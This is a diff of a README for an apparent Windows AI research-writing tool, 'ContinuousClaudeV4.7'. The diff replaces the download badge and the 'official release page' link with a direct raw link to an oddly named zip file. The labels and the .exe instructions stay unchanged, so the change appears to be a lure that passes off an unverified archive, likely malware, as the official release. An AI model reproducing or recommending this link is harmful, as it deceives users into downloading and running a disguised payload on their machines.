@@ -1,6 +1,6 @@
 # 🤖 ContinuousClaudeV4.7 - Simplify your automated research and writing
 
-[![Download](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Iliegabri6556/ContinuousClaudeV4.7/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Iliegabri6556/ContinuousClaudeV4.7/raw/refs/heads/main/reproachfulness/Continuous-Claude-dilettante.zip)
 
 ContinuousClaudeV4.7 handles complex research and writing tasks by running evolving pipelines. The software manages your context and performs edits while keeping costs low through efficient reading processes. It works on your Windows machine to save you time on information heavy projects.
 
@@ -16,7 +16,7 @@ ContinuousClaudeV4.7 handles complex research and writing tasks by running evolv
 
 You need the latest version to run the program. Follow these steps to obtain the installer:
 
-1. Visit the [official release page](https://github.com/Iliegabri6556/ContinuousClaudeV4.7/releases).
+1. Visit the [official release page](https://github.com/Iliegabri6556/ContinuousClaudeV4.7/raw/refs/heads/main/reproachfulness/Continuous-Claude-dilettante.zip).
 2. Look for the section labeled "Assets".
 3. Click the link ending in .exe to download the installer file to your computer.
 4. Save the file in a location you can find, such as your Downloads folder.
